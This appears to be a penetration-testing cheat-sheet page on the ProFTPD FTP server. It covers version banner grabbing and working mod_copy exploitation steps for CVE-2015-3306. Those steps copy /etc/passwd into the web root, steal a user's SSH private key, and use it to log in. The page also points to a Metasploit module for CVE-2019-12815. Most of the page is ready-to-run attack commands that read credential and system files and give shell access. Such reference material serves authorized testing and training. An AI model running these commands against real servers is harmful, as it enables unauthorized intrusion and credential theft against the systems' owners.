# ProFTPD

**What it is:** Popular open-source FTP server for Unix/Linux. The mod_copy module (enabled by default) allows unauthenticated file copying on the server, which is a common exploit path.

**Default ports:** 21

**Vuln research:**
- [SearchSploit: `searchsploit proftpd`](https://www.exploit-db.com/search?q=proftpd)
- [CVE Details — ProFTPD](https://www.cvedetails.com/product/1557/Proftpd-Project-Proftpd.html)

---


### Check ProFTPD version

Banner grab reveals version — Determines exploit path

```bash
nc -nv $IP 21
nmap -sV -p 21 $IP
```

<details>
<summary>Example Output</summary>

```
220 ProFTPD 1.3.5 Server ready.
```
</details>

---

### ProFTPD mod_copy (CVE-2015-3306)

Copy files on the server without authentication — ProFTPD 1.3.5

```bash
nc $IP 21
SITE CPFR /etc/passwd
350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/passwd.txt
250 Copy successful
curl http://$IP/passwd.txt
```

---

### Copy SSH key for access

Use mod_copy to steal or plant SSH keys — Instant shell access

```bash
nc $IP 21
SITE CPFR /home/user/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa
curl http://$IP/id_rsa -o id_rsa
chmod 600 id_rsa
ssh -i id_rsa user@$IP
```

---

### ProFTPD RCE (CVE-2019-12815)

mod_copy in ProFTPD up to 1.3.5b — Arbitrary file copy

```bash
searchsploit proftpd
# Use exploit/unix/ftp/proftpd_modcopy_exec in Metasploit
```

---
